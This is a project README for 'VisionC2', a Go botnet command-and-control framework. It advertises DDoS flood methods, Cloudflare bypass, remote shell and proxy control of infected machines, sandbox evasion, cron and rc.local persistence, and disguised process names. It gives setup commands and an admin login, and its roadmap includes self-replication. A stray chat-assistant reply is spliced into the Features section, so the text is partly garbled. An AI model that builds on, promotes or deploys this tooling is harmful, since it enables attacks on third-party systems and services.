# VisionC2 – Advanced Botnet Command & Control Framework

![VisionC2](https://img.shields.io/badge/VisionC2-V1.7-red) ![Go](https://img.shields.io/badge/Go-1.23.0+-blue) ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green) ![License](https://img.shields.io/badge/License-MIT-yellow)

> VisionC2 is a Go-based botnet with a TUI CNC for network stress testing, featuring TLS 1.3 encryption, 14+ architecture support, remote shell, SOCKS5 proxying, and an interactive terminal UI.
---

## 📑 Table of Contents

### This Document

- [Quick Start](#-quick-start)
- [Features](#-features)
- [Architecture](#️-architecture)

### Documentation

| Document | Description |
|----------|-------------|
| [USAGE.md](USAGE.md) | Full setup guide, deployment, and TUI usage |
| [COMMANDS.md](cnc/COMMANDS.md) | Complete command reference for attacks & shell |
| [CHANGELOG.md](CHANGELOG.md) | Version history and release notes |

---

<p align="center">
  <b>Watch Vision's TLS Bypass Method crash one of the largest DSTAT Graphs with 6 servers</b>
</p>

<p align="center">
  <img src="https://github.com/user-attachments/assets/52ffce78-eb92-4f7c-b34e-ba6ff227e416" alt="Demo Animation">
</p>

---

## 🚀 Quick Start

### Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen
# Go 1.23+ required → https://go.dev/dl/
```

### Installation

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```
---

## ⚙️ Configuration

After running the setup wizard, code changes will be made automatically. However, review `setup_config.txt` for:

- C2 address & ports
- Magic code & encryption keys
- Generated 4096-bit certificates

---

### Starting the C2

**TUI Mode (recommended):**

```bash
cd cnc
./cnc
```

**Split Mode (telnet/multi-user):**

```bash
./cnc --split
# Then connect: nc <server-ip> <admin-port>
# Login trigger: spamtec
```

Bot binaries are automatically built to `bot/bins/`.

**Binary Naming** – Binaries are disguised as kernel/system processes to evade Mirai/Qbot killers and blend with legitimate processes:

| Binary | Architecture | Description |
|--------|--------------|-------------|
| `kworkerd0` | x86 (386) | 32-bit Intel/AMD |
| `ethd0` | x86_64 | 64-bit Intel/AMD |
| `mdsync1` | ARMv7 | Raspberry Pi 2/3 |
| `ip6addrd` | ARM64 | Raspberry Pi 4, Android |
| ... | +10 more | MIPS, PPC64, RISC-V, s390x |

> See [`bot/build.sh`](bot/build.sh) or [`USAGE.md`](USAGE.md) for full 14-architecture mapping.

---

## ✨ Features
Got it — you don’t want a new template. You want **your exact content**, just normalized so it visually matches a polished Markdown feature block.

Here is your content, cleanly formatted and tightened, with identical structure and hierarchy:

---

## ✨ Features

### 🤖 Bot Capabilities

* **Layer 4**: UDP, TCP, SYN, ACK, GRE, DNS flood methods
* **Layer 7**: HTTP / HTTPS / TLS with HTTP/2 fingerprinting and Cloudflare UAM bypass (including CAPTCHA solving)
* **Remote Execution**: Interactive and fire-and-forget shell commands
* **SOCKS5 Proxy**: Turn any agent into a SOCKS5 proxy server

### 🛡️ Security & Stealth

* TLS 1.3 with perfect forward secrecy
* Multi-layer obfuscation (RC4, XOR, byte substitution, MD5)
* HMAC challenge-response authentication
* Anti-analysis & sandbox detection

### 🖥️ TUI Features

* Real-time bot management, visual attack builder, live shell access, and targeting filters
* **Single Agent Targeting**: Interactive management menu for each bot (terminal-like shell on specific bot)
* **Built-in SOCKS5 Proxy Manager** (one-click per bot): Easily manage new or existing proxies
* **Broadcast Shell Execution** with architecture, RAM, and bot count filtering

### ⚡ Performance
* **2 Servers** = **30k–40k Requests Per Second**
* **Layer 4 Throughput(2 servers)**: **2–6 Gbps**
  > *Note: Performance is dependent on your bots’ hardware and network.*
* 14+ architecture support (automated cross-compilation)
* Fully automated 5-minute setup

---

## 🏗️ Architecture

```
Admin Console ──TLS 1.3──► C2 Server ◄──TLS 1.3── Bot Agents (14+ arches)
```

### Bot Startup Flow

```
START → Sandbox Check ──[detected]──► EXIT(200)
              │
              ▼
       Persistence Install (rc.local + cron)
              │
              ▼
┌─────────────────────────────────────────────────────┐
│  C2 RESOLUTION: Decrypt URL → DoH TXT → DNS TXT → A Record → Direct IP  │
└─────────────────────────────────────────────────────┘
              │
              ▼
    ┌──► TLS Connect (C2:443) → Authenticate (HMAC+MD5) → Command Loop ──┐
    │                                                                     │
    └─────────────────────── Reconnect on Disconnect ◄────────────────────┘
```

### HMAC Challenge-Response Authentication

```
   BOT                                         C2 SERVER
    │                                              │
    │ ──────── TLS Handshake ────────────────────► │
    │                                              │
    │ ◄─────── AUTH_CHALLENGE:<random_32_chars> ── │  Server generates unique challenge
    │                                              │
    │   Bot computes: Base64(MD5(challenge + MAGIC_CODE + challenge))
    │                                              │
    │ ──────── AUTH_RESPONSE:<hash> ─────────────► │  Server computes same hash
    │                                              │
    │ ◄─────── AUTH_SUCCESS + Bot info request ─── │  Hashes match = authenticated
    │                                              │
    │ ──────── ARCH|RAM|VERSION ─────────────────► │  Bot sends system info
    │                                              │
    │ ◄═══════ Command Loop Begins ═══════════════ │
```

**Why Challenge-Response?**

- **Prevents replay attacks**: Each connection gets a unique random challenge
- **No plaintext secrets**: Magic code never transmitted over the wire
- **Mutual verification**: Both sides must know the shared secret
- **Lightweight**: MD5 is fast, minimal overhead on embedded devices

### C2 URL Decryption (4-Layer Obfuscation)

```
Encrypted Blob (Base64)
    │
    ├─► Layer 1: Base64 Decode
    ├─► Layer 2: XOR with Derived Key [MD5(seed + split_bytes + entropy)]
    ├─► Layer 3: RC4 Stream Cipher
    ├─► Layer 4: Reverse Byte Substitution (ROL 3, XOR 0xAA)
    └─► Verify: MD5 Checksum (last 4 bytes)
    │
    ▼
Decrypted: "192.168.1.1:443"
```

**Why Multi-Layer?** Base64 hides binary data • XOR defeats static extraction • RC4 encrypts • Byte substitution confuses • MD5 detects tampering

**C2 Resolution Order:** DoH TXT → DNS TXT → A Record → Direct IP

---
## 🗺️ Roadmap

### In Progress

- Enhanced daemonization & persistence
- Locker/killer (remove competing malware)

### Planned

- Auto-generated DGA fallback domains
- Self-replication / spreading
- Single-instance port takeover

See [CHANGELOG.md](CHANGELOG.md) for detailed history.

---

## ⚠️ Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**

The authors are not responsible for any misuse, damage, or legal consequences arising from the use of this software. Use responsibly and legally.

---

## 📜 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## 🤝 Support

- Documentation: [USAGE.md](USAGE.md)
- Issues & feature requests → GitHub Issues
- Contact: <dev@sinners.city>

---
